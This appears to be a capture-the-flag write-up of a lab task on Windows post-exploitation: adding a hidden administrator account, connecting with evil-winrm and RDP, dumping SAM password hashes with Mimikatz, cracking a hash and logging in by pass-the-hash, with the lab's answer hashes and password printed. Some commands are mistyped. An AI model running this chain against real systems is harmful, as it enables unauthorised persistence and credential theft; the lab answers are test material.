**Task 21: Stabilisation & Post Exploitation**

For this task we have to make changes in the prov-serv only the commands are as follows...

Make sure to execute the commands in proper syntax cause the command prompt wont response to errors..
- 1. Create your a user with any name you want
 
         net user USERNAME PASSWORD /add

- 2. Add the user in the Administration directory
 
         net localgroup Administrators USERNAME /add

- 3. Now add the user in the remote managment group
 
         net localgroup Administrators USERNAME /add

- 4. Now verify wether you have done the process correctly
 
         net user <yourusername>

![Screenshot_2023-08-08_04_50_52](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/2fa161a4-cb4b-411c-9d0b-7e7e4a1670c0)

After doing all this lets move forward with the installtion of evil-winrm, if its not installed by deafult in your system type the command
to install it using ruby.

    sudo gem install evil-winrm


After this we try to connect to the win machine using the following commands:

    evil-winrm -u <yourusername> -p <pass> -i <tragetip>

After this check wether you are connected successfully or not by typing the command as `whoami`

Then check the group of the account wether its, the prev steps that we did were correct or not by just adding `/group` ..

The whole process will look something like this:

![Screenshot_2023-08-09_03_00_09](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/9437e052-d216-44b2-b222-dbdab3a60bde)


Lets see all the users that are pressent in the system .

So we have total 5 users including me, in the next task we have to extract the password of the Administrative account..

For this we will be using the RDP method

If you are using VM make sure to increase your RAM upto like 6 gb..

![Screenshot_2023-08-09_03_17_52](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/b1baf9db-d144-4537-a4ec-1741b2eb6ad9)

After this we will be using this command ..

    xfreerdp /v:10.200.57.150 /u:trial2222 /p:giligilichu +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share

After doing this we will check wether we have the access on not..

![shared](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/78f17575-ff5f-4274-bab3-82d12d42b4c5)


Yes we do have the access

With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator 

First open the mimikatz 

   \\tsclient\share\mimikatz\x64\mimikatz.exe

You might be wondering what mimikatz is..

Mimikatz is both an exploit on Microsoft Windows that extracts passwords stored in memory and software that performs that exploit. It was created by French programmer Benjamin Delpy and is French slang for "cute cats"

After gaining the access on it we will type the following commands..
- 1

        privilege::debug
  
Next:

    token::elevate

If you want to save the file in the logs then you can type the command as follows 

    log c:\windows\temp\mimikatz.log

![priv](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/3b51d99d-e2bd-43a0-ad99-2b5f069334ab)


We can now dump all of the SAM local password hashes using:

    lsadump::sam

U can use any user like if you want to use thomas change the command as lsadumo::thomas

One more thing if you want to copy something from the terminal `ctrl+c' won't instead try `ctrl+shift+c` same with paste option..

**Q.What is the Administrator password hash?**

    37db630168e5f82aafa8461e05c6bbd1

![adminhash](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/a5aaa5f7-0852-49e6-a25a-7709d897666c)

**Q. What is the NTLM password hash for the user "Thomas"?**

    02d90eda8f6b6b06c32d5f207831101f

**Q. What is Thomas' password?**

This can be cracked using the https://crackstation.net/

The result is : `i>3ruby`

In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

So for this we can save the administrative hash and try to connect with it using the command as follows

    evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150

![adminpreo](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/94ed489f-9f61-4125-b4bf-50058be8d2a2)


With this task 21 ends...
